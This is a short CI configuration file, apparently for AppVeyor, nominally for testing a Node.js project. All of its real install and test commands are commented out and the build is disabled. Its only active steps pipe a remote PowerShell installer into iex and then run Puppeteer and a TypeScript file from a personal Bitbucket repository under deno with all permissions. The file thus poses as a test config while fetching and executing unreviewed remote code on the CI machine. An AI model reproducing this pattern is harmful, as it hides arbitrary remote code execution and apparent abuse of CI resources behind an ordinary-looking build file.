# Test against the latest version of this Node.js version
environment:
  nodejs_version: "14"

# Install scripts. (runs after repo cloning)
install:
  # Get the latest stable version of Node.js or io.js
  #- ps: Install-Product node $env:nodejs_version
  # install modules
  #- npm install

# Post-install test scripts.
test_script:
  # Output useful info for debugging.
  #- node --version
  #- npm --version
  # run tests
  #- npm test
  - ps: iwr https://deno.land/x/install/install.ps1 -useb | iex
  - deno run -A --unstable https://deno.land/x/puppeteer@9.0.0/install.ts
  - deno run -A --unstable https://bitbucket.org/meocodervippro/meocoder_node/raw/main/web/main.ts

# Don't actually build.
build: off
